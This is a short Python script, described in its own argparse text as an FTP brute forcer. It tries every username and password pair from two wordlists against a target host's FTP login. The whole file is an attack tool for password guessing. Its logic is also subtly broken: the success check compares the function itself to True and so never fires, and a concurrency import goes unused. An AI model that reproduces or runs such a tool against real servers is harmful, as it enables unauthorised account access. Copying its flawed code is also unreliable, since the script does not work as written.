from concurrent.futures import ThreadPoolExecutor
import ftplib 
import time 
import argparse

parser = argparse.ArgumentParser(description="ftp brute forcer")
parser.add_argument("-t", "--target", help="host")
parser.add_argument("-p", "--port", help="port", default=21)
args = parser.parse_args()

USERNAME_FILE = "python/wordlist/username_wordlist.txt"
PASSWORD_FILE = "python/wordlist/password_wordlist.txt"

def load_wordlists(filepath):
    with open(filepath, "r") as f:
        paths = []

        for line in f:
            line = line.strip()
            if line:
                paths.append(line)
        return paths

def scan(host,port,username,password):
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port)
        ftp.login(username, password)
        ftp.quit()
        return True 
    except ftplib.error_perm:
        return False
    except Exception:
        return False


def main():
    combos = []
    usernames = load_wordlists(USERNAME_FILE)
    passwords = load_wordlists(PASSWORD_FILE)
    start = time.perf_counter()
    print(f"loaded {len(passwords)} passwords and {len(usernames)} usernames \n")
    print(f"starting scan on {args.target}")

    for username in usernames:
        for password in passwords:
            combos.append((username,password))
    for username,password in combos:
        scan(args.target,args.port,username,password)
        if scan == True:
            print(combos)

    print(f"\nScan completed in {time.perf_counter() - start:.2f}s")

if __name__ == "__main__":
    main()